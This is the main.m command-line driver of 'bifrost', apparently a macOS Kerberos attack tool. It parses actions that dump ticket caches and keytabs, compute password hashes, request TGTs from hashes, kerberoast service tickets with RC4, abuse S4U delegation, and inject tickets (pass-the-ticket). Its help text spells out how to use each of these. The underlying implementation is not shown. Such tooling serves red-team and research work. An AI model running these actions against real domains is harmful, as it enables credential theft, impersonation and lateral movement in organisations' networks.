//
//  main.m
//  bifrostconsole
//
//  Created by @its_a_feature_ on 10/14/19.
//  Copyright © 2019 Cody Thomas (@its_a_feature_). All rights reserved.
//

#import <Foundation/Foundation.h>
#import "bifrost.h"
void printHelp(){
    printf("\nUsage:\n./bifrost -action [dump | list | askhash | describe | asktgt | asktgs | s4u | ptt | remove | asklkdcdomain]\n");
    printf("For dump action:\n");
    printf("\t-source [tickets | keytab]\n");
    printf("\t\tfor keytab, optional -path to specify a keytab\n");
    printf("\t\tfor tickets, optional -name to specify a ccache entry to dump\n");
    printf("For list action:\n");
    printf("\t no other options are necessary\n");
    printf("For askhash action:\n");
    printf("\t-username a.test -password 'mypassword' -domain DOMAIN.COM\n");
    printf("\t\t optionally specify -enctype [aes256 | aes128 | rc4] or get all of them\n");
    printf("\t\t optionally specify -bpassword 'base64 of password' in case there might be issues with parsing or special characters\n");
    printf("For asktgt action:\n");
    printf("\t-username a.test -domain DOMAIN.COM\n");
    printf("\t\t if using a plaintext password, specify -password 'password'\n");
    printf("\t\t if using a hash, specify -enctype [aes256 | aes128 | rc4] -hash [hash_here]\n");
    printf("\t\t\t optionally specify -tgtEnctype [aes256|aes128|rc4] to request a TGT with a specific encryption type\n");
    printf("\t\t\t optionally specify -supportAll false to indicate that you want a TGT to match your hash enctype, otherwise will try to get AES256\n");
    printf("\t\t if using a keytab, specify -enctype and -keytab [keytab path] to pull a specific hash from the keytab\n");
    printf("\t\t\t optionally specify -tgtEnctype [aes256|aes128|rc4] to request a TGT with a specific encryption type\n");
    printf("\t\t\t optionally specify -supportAll false to indicate that you want a TGT to match your hash enctype, otherwise will try to get AES256\n");
    printf("For describe action:\n");
    printf("\t-ticket base64KirbiTicket\n");
    printf("For asktgs action:\n");
    printf("\t-ticket [base64 of TGT]\n");
    printf("\t-service [comma separated list of SPNs]\n");
    printf("\t optionally specify -connectDomain to connect to a domain other than the one specified in the ticket\n");
    printf("\t optionally specify -serviceDomain to request a service ticket in a domain other than the one specified in the ticket\n");
    printf("\t optionally specify -kerberoast true to indicate a request for rc4 instead of aes256\n");
    printf("For s4u:\n");
    printf("\t-ticket [base64 of TGT]\n");
    printf("\t-targetUser [target user in current domain, or targetuser@domain for a different domain]\n");
    printf("\t-spn [target SPN] (if this isn't specified, just a forwardable S4U2Self ticket is requested as targetUser)\n");
    printf("\t optionally specify -connectDomain [domain or host to connect to]\n");
    printf("For ptt:\n");
    printf("\t-ticket [base64 of kirbi ticket]\n");
    printf("\t optionally specify -name [name] to import the ticket into a specific credential cache\n");
    printf("\t optionally specify -name new to import the ticket into a new credential cache\n");
    printf("For remove:\n");
    printf("\t for tickets: -source tickets -name [name here] (removes an entire ccache)\n");
    printf("\t for keytabs: -source keytab -principal [principal name] (removes all entries for that principal)\n");
    printf("\t for keytabs: optionally specify -name to not use the default keytab\n");
    printf("\t you can't remove a specific ccache principal entry since it seems to not be implemented in heimdal\n");
    printf("For asklkdcdomain:\n");
    printf("\t -LKDCIP [remote IP address here]\n");
    printf("For storelkdcinfo:\n");
    printf("\t -username [username] -LKDCIP [remote host IP] -password [user's password] -cacheName [cache name to store info]");
}
int main(int argc, const char * argv[]) {
    printf(
    " ___         ___                   _     \n"
    "(  _`\\  _  /'___)                 ( )_  \n"
    "| (_) )(_)| (__  _ __   _     ___ | ,_)  \n"
    "|  _ <'| || ,__)( '__)/'_`\\ /',__)| |   \n"
    "| (_) )| || |   | |  ( (_) )\\__, \\| |_ \n"
    "(____/'(_)(_)   (_)  `\\___/'(____/\\__) \n"
           "\n");
    NSUserDefaults *arguments = [NSUserDefaults standardUserDefaults];
    bifrost* test = [[bifrost alloc] init];
    if(argc < 2){
        printHelp();
        return 0;
    }
    NSString* action = @"";
    @try{
        if( [arguments objectForKey:@"action"] ){
            action = [arguments stringForKey:@"action"];
        }
        else{
            printHelp();
            return 0;
        }
        if( [action isEqualToString:@"describe"] ){
            if( [arguments objectForKey:@"ticket"]){
                NSString* encodedTicket = [arguments stringForKey:@"ticket"];
                NSData* decodedTicket = [[NSData alloc] initWithBase64EncodedString:encodedTicket options:0];
                if(decodedTicket.bytes == nil){
                    printf("[-] Failed to base64 decode ticket\n");
                    return -1;
                }
                Krb5Ticket ticket = parseKirbi(decodedTicket);
                NSString* description = describeTicket(ticket);
                printf("%s\n", description.UTF8String);
            } else {
                printf("[-] Missing -ticket parameter\n");
                return -1;
            }
        }
        else if( [action isEqualToString:@"dump"]){
            NSString* source;
            if( [arguments objectForKey:@"source"] ){
                source = [arguments stringForKey:@"source"];
            } else{
                printf("[-] Missing -source [tickets|keytab]\n");
                return -1;
            }
            if( [source isEqualToString:@"tickets"] ){
                //read the local ticket cache via klist apis to Kirbi
                if( [arguments objectForKey:@"name"] ){
                    NSString* cache = [arguments stringForKey:@"name"];
                    [test dumpCredentialsToKirbiCCache:cache.UTF8String Destroy:false];
                }else{
                    [test dumpCredentialsToKirbiCCache:NULL Destroy:false];
                }
                
            } else if( [source isEqualToString:@"keytab"] ){
                //read a specified keytab file and parse out the entries, optionally giving an NSString of a path to a keytab file
                if( [arguments objectForKey:@"path"] ){
                    NSString* path = [arguments stringForKey:@"path"];
                    [test ktutilKeyTabPath:path];
                }else{
                    [test ktutilKeyTabPath:NULL];
                }
            } else {
                printf("[-] Unknown source\n");
                return 0;
            }
        }
        else if( [action isEqualToString:@"askhash"]){
            uint enctype = 0;
            NSString* username;
            NSString* password;
            NSString* domain;
            if( [arguments objectForKey:@"enctype"] ){
                NSString* enctypeString = [arguments stringForKey:@"enctype"];
                enctype = [test getEncValueFromEnctype:enctypeString];
            }
            if( [arguments objectForKey:@"username"] ){
                username = [arguments stringForKey:@"username"];
            } else {
                printf("[-] Missing -username\n");
                return 0;
            }
            if( [arguments objectForKey:@"password"] ){
                password = [arguments stringForKey:@"password"];
            } else if([ arguments objectForKey:@"bpassword"] ){
                NSString* encodedPassword = [arguments stringForKey:@"bpassword"];
                password = [[NSString alloc] initWithData:[[NSData alloc] initWithBase64EncodedString:encodedPassword options:0] encoding:NSUTF8StringEncoding];
            }else{
                printf("[-] Missing -password\n");
                return 0;
            }
            if( [arguments objectForKey:@"domain"] ){
                domain = [arguments stringForKey:@"domain"];
                domain = [domain uppercaseString];
            } else {
                printf("[-] Missing -domain\n");
                return 0;
            }
            NSString *key = [test genPasswordHashPassword:password.UTF8String Length:password.length Enc:enctype Username:username Domain:domain Pretty:TRUE];
            printf("\n%s\n", key.UTF8String);
        }
        else if( [action isEqualToString:@"asktgt"]){
            uint enctype = 0;
            uint tgtEnctype = 0;
            NSString* username = NULL;
            NSString* password = NULL;
            NSString* domain = NULL;
            NSString* hash = NULL;
            NSString* keytab = NULL;
            NSString* connectDomain = NULL;
            NSString* LKDCIP = NULL;
            bool supportAll = true;
            if( [arguments objectForKey:@"enctype"] ){
                NSString* enctypeString = [arguments stringForKey:@"enctype"];
                enctype = [test getEncValueFromEnctype:enctypeString];
                if(enctype == 0){
                    printf("[-] Unknown encryption type, use: [aes256 | aes128 | rc4 | des3]\n");
                    return -1;
                }
            }
            if( [arguments objectForKey:@"tgtEnctype"] ){
                NSString* enctypeString = [arguments stringForKey:@"tgtEnctype"];
                tgtEnctype = [test getEncValueFromEnctype:enctypeString];
                if(tgtEnctype == 0){
                    printf("[-] Unknown encryption type, use: [aes256 | aes128 | rc4 | des3]\n");
                    return -1;
                }
            }
            if( [arguments objectForKey:@"username"] ){
                username = [arguments stringForKey:@"username"];
            }
            else {
                printf("[-] Missing username\n");
                return 0;
            }
            if( [arguments objectForKey:@"supportAll"] ){
                supportAll = [arguments boolForKey:@"supportAll"];
            }
            if( [arguments objectForKey:@"domain"] ){
                domain = [arguments stringForKey:@"domain"];
                domain = [domain uppercaseString];
            }
            if( [arguments objectForKey:@"connectDomain"] ){
                connectDomain = [arguments stringForKey:@"connectDomain"];
            }
            if( [arguments objectForKey:@"LKDCIP"] ){
                LKDCIP = [arguments stringForKey:@"LKDCIP"];
            }
            if( [arguments objectForKey:@"password"] ){
                //TODO: go back and make this generate a password hash instead
                //get a user's TGT with a username, password, and domain
                password = [arguments stringForKey:@"password"];
            }
            else if([ arguments objectForKey:@"bpassword"] ){
                NSString* encodedPassword = [arguments stringForKey:@"bpassword"];
                password = [[NSString alloc] initWithData:[[NSData alloc] initWithBase64EncodedString:encodedPassword options:0] encoding:NSUTF8StringEncoding];
            }
            if(password != NULL){
                hash = [test genPasswordHashPassword:password.UTF8String Length:password.length Enc:ENCTYPE_AES256_CTS_HMAC_SHA1_96 Username:username Domain:domain Pretty:FALSE];
                enctype = ENCTYPE_AES256_CTS_HMAC_SHA1_96;
                if(hash == NULL){
                    printf("[-] Failed to gen password hash from plaintext\n");
                    return 0;
                }
            }
            if( [arguments objectForKey:@"hash"]){
                //get a user's TGT with a username, hash, and domain
                hash = [arguments stringForKey:@"hash"];
                if(enctype == 0){
                    printf("[-] Must supply -enctype [aes256|aes128|rc4|des3] with -hash to identify the type of hash supplied\n");
                    return -1;
                }
            }
            else if( [arguments objectForKey:@"keytab"]){
                //use username and domain to find the right entry in the keytab
                keytab = [arguments stringForKey:@"keytab"];
                if( [keytab isEqualToString:@"default"]){
                    //use the default keytab to do this request
                    keytab = NULL;
                }
                NSString* principal = [[NSString alloc] initWithFormat:@"%s@%s", username.UTF8String, domain.UTF8String];
                hash = [test getKeyFromKeytab:keytab andPrincipal:principal withEnctype:enctype];
                if(hash == NULL){
                    return -1;
                }
                printf("[+] Using hash: %s\n", hash.UTF8String);
            }
            else {
                printf("[-] No hash or password supplied\n");
                return -1;
            }
            // perform normal Active Directory kerberos traffic based on the supplied data
            if( tgtEnctype != 0 ){
                //specify the desired end ticket encryption type if desired to be different than the hash's enc type and not negotiated
                printf("[*] Requesting hash type: %d\n", tgtEnctype);
                if(connectDomain == NULL){
                    [test askTGTConnectDomain:domain EncType:enctype Hash:hash Username:username Domain:domain SupportAll:false TgtEnctype:tgtEnctype LKDCIP:LKDCIP];
                }else{
                    [test askTGTConnectDomain:connectDomain EncType:enctype Hash:hash Username:username Domain:domain SupportAll:false TgtEnctype:tgtEnctype LKDCIP:LKDCIP];
                }
                
            }
            else{
                if(connectDomain == NULL){
                    [test askTGTConnectDomain:domain EncType:enctype Hash:hash Username:username Domain:domain SupportAll:supportAll TgtEnctype:enctype LKDCIP:LKDCIP];
                }else{
                    [test askTGTConnectDomain:connectDomain EncType:enctype Hash:hash Username:username Domain:domain SupportAll:supportAll TgtEnctype:enctype LKDCIP:LKDCIP];
                }
                
            }
            return 0;
            
        }
        else if( [action isEqualToString:@"asktgs"] ){
            NSString* encodedTicket;
            NSString* services;
            NSString* serviceDomain = NULL;
            NSString* connectDomain = NULL;
            NSString* LKDCIP = NULL;
            if( [arguments objectForKey:@"ticket"] ){
                encodedTicket = [arguments stringForKey:@"ticket"];
            }else{
                printf("[-] Missing required parameter -ticket\n");
                return 0;
            }
            if( [arguments objectForKey:@"service"] ){
                services = [arguments stringForKey:@"service"];
            }else{
                printf("[-] Missing required parameter -service\n");
                return 0;
            }
            bool kerberoast = false;
            if( [arguments objectForKey:@"kerberoast"]){
                kerberoast = [arguments boolForKey:@"kerberoast"];
            }
            
            NSArray* serviceList = [services componentsSeparatedByString:@","];

            if( [arguments objectForKey:@"serviceDomain"] ){
                serviceDomain = [arguments stringForKey:@"serviceDomain"];
            }
            if( [arguments objectForKey:@"connectDomain"] ){
                connectDomain = [arguments stringForKey:@"connectDomain"];
            }
            if( [arguments objectForKey:@"LKDCIP"] ){
                LKDCIP = [arguments stringForKey:@"LKDCIP"];
            }
            for(int i = 0; i < [serviceList count]; i++){
                NSString* service = (NSString*)[serviceList objectAtIndex:i];
                NSString* result = [test askTGSConnectDomain:connectDomain TGT:encodedTicket Service:service ServiceDomain:serviceDomain Kerberoast:kerberoast LKDCIP:LKDCIP];
            }
            return 0;
        }
        else if( [action isEqualToString:@"list"] ){
            [test listAllCCaches];
        }
        else if( [action isEqualToString:@"ptt"] ){
            NSString* encodedTicket;
            NSString* ccache;
            //Krb5Ticket ticket;
            if( [arguments objectForKey:@"ticket"] ){
                encodedTicket = [arguments stringForKey:@"ticket"];
            }else{
                printf("[-] Missing required parameter: -ticket\n");
                return -1;
            }
            if( [arguments objectForKey:@"name"] ){
                ccache = [arguments stringForKey:@"name"];
            }else{
                ccache = @"new";
            }
            [test importCred:encodedTicket ToCache:ccache];
        }
        else if( [action isEqualToString:@"remove"] ){
            NSString* source;
            NSString* name = NULL;;
            NSString* principal = @"";
            if( [arguments objectForKey:@"source"]){
                source = [arguments stringForKey:@"source"];
            }else{
                printf("[-] Missing required argument -source\n");
                return -1;
            }
            if([source isEqualToString:@"tickets"]){
                if( [arguments objectForKey:@"name"] ){
                    name = [arguments stringForKey:@"name"];
                    /*
                    if([arguments objectForKey:@"principal"]){
                        principal = [arguments stringForKey:@"principal"];
                        [test removePrincipal:principal FromCacheName:name];
                    }else{
                        [test removeCacheName:name];
                    }*/
                    [test removeCacheName:name];
                }else{
                    printf("[-] Missing required argument -name\n");
                    return -1;
                }
            }
            else if([source isEqualToString:@"keytab"]){
                if( [arguments objectForKey:@"name"] ){
                    name = [arguments stringForKey:@"name"];
                }
                if( [arguments objectForKey:@"principal"] ){
                    principal = [arguments stringForKey:@"principal"];
                }else{
                    printf("[-] Missing required field -principal\n");
                    return -1;
                }
                [test removePrincipal:principal fromKeytab:name];
            }else{
                printf("[-] Unknown source\n");
            }
        }
        else if( [action isEqualToString:@"s4u"] ){
            NSString* encodedTicket;
            NSString* targetUser;
            NSString* spn;
            NSString* connectDomain = NULL;
            if( [arguments objectForKey:@"ticket"] ){
                encodedTicket = [arguments stringForKey:@"ticket"];
            }else{
                printf("[-] Missing required argument -ticket\n");
                return -1;
            }
            if( [arguments objectForKey:@"targetUser"] ){
                targetUser = [arguments stringForKey:@"targetUser"];
            }else{
                printf("[-] Missing required argument -targetUser\n");
                return -1;
            }
            if( [arguments objectForKey:@"connectDomain"] ){
                connectDomain = [arguments stringForKey:@"connectDomain"];
            }
            if( [arguments objectForKey:@"spn"] ){
                spn = [arguments stringForKey:@"spn"];
                //this means we're doing the full S4U2Self and S4U2Proxy scenario
                [test s4uTicket:encodedTicket ConnectDomain:connectDomain TargetUser:targetUser SPN:spn];
            }else{
                //this means we're just doing the S4U2Self scenario
                [test s4u2selfTicket:encodedTicket ConnectDomain:connectDomain TargetUser:targetUser];
            }
        }
        else if( [action isEqualToString:@"asklkdcdomain"] ){
            NSString* LKDCIP = NULL;
            if( [arguments objectForKey:@"LKDCIP"] ){
                LKDCIP = [arguments stringForKey:@"LKDCIP"];
            }
            else{
                printf("[-] Missing required parameter of LKDCIP\n");
            }
        
            [test askLKDCDomainByIP:LKDCIP];
        }
        else if( [action isEqualToString:@"storelkdcinfo"] ){
            NSString* username = NULL;
            NSString* LKDCIP = NULL;
            NSString* password = NULL;
            NSString* cacheName = NULL;
            if( [arguments objectForKey:@"LKDCIP"] ){
                LKDCIP = [arguments stringForKey:@"LKDCIP"];
            }
            else{
                printf("[-] Missing required parameter of LKDCIP\n");
            }
            if( [arguments objectForKey:@"username"] ){
                username = [arguments stringForKey:@"username"];
            }
            else{
                printf("[-] Missing required parameter of username\n");
            }
            if( [arguments objectForKey:@"password"] ){
                password = [arguments stringForKey:@"password"];
            }
            else{
                printf("[-] Missing required parameter of password\n");
            }
            if( [arguments objectForKey:@"cacheName"] ){
                cacheName = [arguments stringForKey:@"cacheName"];
            }
            else{
                printf("[-] Missing required parameter of cacheName\n");
            }
            [test storeLKDCConfDataFriendlyName:username Hostname:LKDCIP Password:password CCacheName:cacheName];
        }
        else {
            printHelp();
        }
        return 0;
    }@catch(NSException* exception){
        printf("[-] Final error: %s\n", exception.reason.UTF8String);
        return -1;
    }
}

